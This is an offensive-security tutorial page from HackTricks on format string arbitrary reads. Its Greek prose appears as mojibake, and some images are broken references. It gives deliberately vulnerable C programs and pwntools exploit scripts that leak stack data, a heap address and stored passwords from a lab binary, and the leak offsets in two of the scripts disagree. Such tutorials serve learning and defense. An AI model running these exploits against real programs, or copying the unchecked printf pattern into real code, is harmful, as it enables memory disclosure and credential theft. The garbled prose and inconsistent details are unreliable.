# Format Strings - Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î”Î¹Î±Î²Î¬ÏƒÎ¼Î±Ï„Î¿Ï‚ Î‘Ï…Î¸Î±Î¯ÏÎµÏ„Ï‰Î½ Î”ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ Hacking Ï„Î¿Ï… AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Î•ÎºÏ€Î±Î¯Î´ÎµÏ…ÏƒÎ· AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ Hacking Ï„Î¿Ï… GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Î•ÎºÏ€Î±Î¯Î´ÎµÏ…ÏƒÎ· GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ** ğŸ’¬ [**ÏƒÏ„Î·Î½ Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs** ÏƒÏ„Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ Ï„Î¿Ï… [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Î”Î¹Î¬Î²Î±ÏƒÎ¼Î± Î‘ÏÏ‡Î®Ï‚ Î”Ï…Î±Î´Î¹ÎºÎ¿Ï ÎšÏÎ´Î¹ÎºÎ±

### ÎšÏÎ´Î¹ÎºÎ±Ï‚
```c
#include <stdio.h>

int main(void) {
char buffer[30];

fgets(buffer, sizeof(buffer), stdin);

printf(buffer);
return 0;
}
```
ÎœÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¯ÏƒÏ„Îµ Ï„Î¿ Î¼Îµ:
```python
clang -o fs-read fs-read.c -Wno-format-security -no-pie
```
### Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·
```python
from pwn import *

p = process('./fs-read')

payload = f"%11$s|||||".encode()
payload += p64(0x00400000)

p.sendline(payload)
log.info(p.clean())
```
* Î¤Î¿ **offset ÎµÎ¯Î½Î±Î¹ 11** ÎµÏ€ÎµÎ¹Î´Î® Î¼Îµ Ï„Î·Î½ ÏÏÎ¸Î¼Î¹ÏƒÎ· Ï€Î¿Î»Î»ÏÎ½ Î‘ ÎºÎ±Î¹ **brute-forcing** Î¼Îµ Î­Î½Î±Î½ Î²ÏÏŒÎ³Ï‡Î¿ Ï€Î¿Ï… Î¼ÎµÏ„Î±ÎºÎ¹Î½ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ 0 Î­Ï‰Ï‚ 50, Î´Î¹Î±Ï€Î¹ÏƒÏ„ÏÎ¸Î·ÎºÎµ ÏŒÏ„Î¹ ÏƒÏ„Î¿ offset 11 ÎºÎ±Î¹ Î¼Îµ 5 ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ (ÏƒÏ„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ® Î¼Î±Ï‚ pipes `|`), ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎ»ÎµÎ³Ï‡Î¸ÎµÎ¯ Î¼Î¹Î± Ï€Î»Î®ÏÎ·Ï‚ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·.
* Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¯Î·ÏƒÎ± Ï„Î¿ **`%11$p`** Î¼Îµ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î³Î­Î¼Î¹ÏƒÎ¼Î± Î¼Î­Ï‡ÏÎ¹ Î½Î± Î´Ï‰ ÏŒÏ„Î¹ Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î®Ï„Î±Î½ ÏŒÎ»Î± 0x4141414141414141
* Î¤Î¿ **Ï†Î¿ÏÏ„Ï‰Î¼Î­Î½Î¿ string Î¼Î¿ÏÏ†Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ Î Î¡Î™Î Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·** ÎµÏ€ÎµÎ¹Î´Î® Ï„Î¿ **printf ÏƒÏ„Î±Î¼Î±Ï„Î¬ÎµÎ¹ Ï„Î·Î½ Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· ÏƒÎµ Î­Î½Î± Î¼Î·Î´ÎµÎ½Î¹ÎºÏŒ byte**, Î¿Ï€ÏŒÏ„Îµ Î±Î½ ÏƒÏ„ÎµÎ¯Î»Î¿Ï…Î¼Îµ Ï€ÏÏÏ„Î± Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎºÎ±Î¹ Î¼ÎµÏ„Î¬ Ï„Î¿ string Î¼Î¿ÏÏ†Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚, Ï„Î¿ printf Î´ÎµÎ½ Î¸Î± Ï†Ï„Î¬ÏƒÎµÎ¹ Ï€Î¿Ï„Î­ Ï„Î¿ string Î¼Î¿ÏÏ†Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ ÎºÎ±Î¸ÏÏ‚ Î¸Î± Î²ÏÎµÎ¹ Î­Î½Î± Î¼Î·Î´ÎµÎ½Î¹ÎºÏŒ byte Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ.
* Î— ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Ï„Î¿ 0x00400000 ÎµÏ€ÎµÎ¹Î´Î® ÎµÎºÎµÎ¯ Î¾ÎµÎºÎ¹Î½Î¬ÎµÎ¹ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ (Ï‡Ï‰ÏÎ¯Ï‚ PIE)
```c
#include <stdio.h>
#include <string.h>

char bss_password[20] = "hardcodedPassBSS"; // Password in BSS

int main() {
char stack_password[20] = "secretStackPass"; // Password in stack
char input1[20], input2[20];

printf("Enter first password: ");
scanf("%19s", input1);

printf("Enter second password: ");
scanf("%19s", input2);

// Vulnerable printf
printf(input1);
printf("\n");

// Check both passwords
if (strcmp(input1, stack_password) == 0 && strcmp(input2, bss_password) == 0) {
printf("Access Granted.\n");
} else {
printf("Access Denied.\n");
}

return 0;
}
```
ÎœÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¯ÏƒÏ„Îµ Ï„Î¿ Î¼Îµ:
```bash
clang -o fs-read fs-read.c -Wno-format-security
```
### Î”Î¹Î¬Î²Î±ÏƒÎ¼Î± Î±Ï€ÏŒ Ï„Î· ÏƒÏ„Î¿Î¯Î²Î±

ÎŸ **`stack_password`** Î¸Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Ï„ÎµÎ¯ ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î± ÎµÏ€ÎµÎ¹Î´Î® ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Ï„Î¿Ï€Î¹ÎºÎ® Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î®, Î¿Ï€ÏŒÏ„Îµ Î±Ï€Î»Î¬ ÎºÎ±Ï„Î±Ï‡ÏÏÎ½Ï„Î±Ï‚ Ï„Î¿ printf Î³Î¹Î± Î½Î± ÎµÎ¼Ï†Î±Î½Î¯ÏƒÎµÎ¹ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï„Î·Ï‚ ÏƒÏ„Î¿Î¯Î²Î±Ï‚ ÎµÎ¯Î½Î±Î¹ Î±ÏÎºÎµÏ„ÏŒ. Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¹ÎºÏŒ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Î³Î¹Î± Î½Î± Î´Î¹Î±Î²ÏÎµÎ¯ Ï„Î¹Ï‚ Ï€ÏÏÏ„ÎµÏ‚ 100 Î¸Î­ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹ Ï„Î¿Ï…Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î±Ï€ÏŒ Ï„Î· ÏƒÏ„Î¿Î¯Î²Î±:
```python
from pwn import *

for i in range(100):
print(f"Try: {i}")
payload = f"%{i}$s\na".encode()
p = process("./fs-read")
p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
Î£Ï„Î·Î½ ÎµÎ¹ÎºÏŒÎ½Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î¿ÏÎ¼Îµ ÏŒÏ„Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎ¿Ï…Î¼Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î±Ï€ÏŒ Ï„Î· ÏƒÏ„Î¿Î¯Î²Î± ÏƒÏ„Î· Î¸Î­ÏƒÎ· `10Î·`:

<figure><img src="../../.gitbook/assets/image (1234).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1233).png" alt="" width="338"><figcaption></figcaption></figure>

### Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Î´ÎµÎ´Î¿Î¼Î­Î½Î±

Î•ÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Î¯Î´Î¹Î¿ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¹ÎºÏŒ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Î±Î»Î»Î¬ Î¼Îµ `%p` Î±Î½Ï„Î¯ Î³Î¹Î± `%s` ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎ¿Ï…Î¼Îµ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏƒÏ‰ÏÎ¿Ï Î±Ï€ÏŒ Ï„Î· ÏƒÏ„Î¿Î¯Î²Î± ÏƒÏ„Î¿ `%25$p`. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, ÏƒÏ…Î³ÎºÏÎ¯Î½Î¿Î½Ï„Î±Ï‚ Ï„Î· Î´Î¹Î±ÏÏÎµÏ…ÏƒÎ¼Î­Î½Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· (`0xaaaab7030894`) Î¼Îµ Ï„Î· Î¸Î­ÏƒÎ· Ï„Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î· Î¼Î½Î®Î¼Î· ÏƒÎµ Î±Ï…Ï„Î®Î½ Ï„Î· Î´Î¹ÎµÏÎ³Î±ÏƒÎ¯Î± Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î»Î¬Î²Î¿Ï…Î¼Îµ Ï„Î· Î´Î¹Î±Ï†Î¿ÏÎ¬ Ï„Ï‰Î½ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

Î¤ÏÏÎ± ÎµÎ¯Î½Î±Î¹ Î· ÏƒÏ„Î¹Î³Î¼Î® Î½Î± Î²ÏÎ¿ÏÎ¼Îµ Ï€ÏÏ‚ Î½Î± ÎµÎ»Î­Î³Î¾Î¿Ï…Î¼Îµ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î± Î³Î¹Î± Î½Î± Î­Ï‡Î¿Ï…Î¼Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î±Ï€ÏŒ Ï„Î· Î´ÎµÏÏ„ÎµÏÎ· ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Ï„Î·Ï‚ Î´ÎµÏÏ„ÎµÏÎ·Ï‚ ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬Ï‚ Î¼Î¿ÏÏ†Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚:
```python
from pwn import *

def leak_heap(p):
p.sendlineafter(b"first password:", b"%5$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

for i in range(30):
p = process("./fs-read")

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

password_addr = heap_leak_addr - 0x126a

print(f"Try: {i}")
payload = f"%{i}$p|||".encode()
payload += b"AAAAAAAA"

p.sendline(payload)
output = p.clean()
print(output.decode("utf-8"))
p.close()
```
ÎšÎ±Î¹ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î¿ÏÎ¼Îµ ÏŒÏ„Î¹ ÏƒÏ„Î¿ **try 14** Î¼Îµ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… passing Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÎµÎ»Î­Î³Î¾Î¿Ï…Î¼Îµ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

### Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·
```python
from pwn import *

p = process("./fs-read")

def leak_heap(p):
# At offset 25 there is a heap leak
p.sendlineafter(b"first password:", b"%25$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

# Offset calculated from the leaked position to the possition of the pass in memory
password_addr = heap_leak_addr + 0x1f7bc

print(f"Calculated address is: {hex(password_addr)}")

# At offset 14 we can control the addres, so use %s to read the string from that address
payload = f"%14$s|||".encode()
payload += p64(password_addr)

p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ** ğŸ’¬ [**ÏƒÏ„Î·Î½ Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± Ï‡Î¬ÎºÎµÏ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs** ÏƒÏ„Î± [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
{% endhint %}
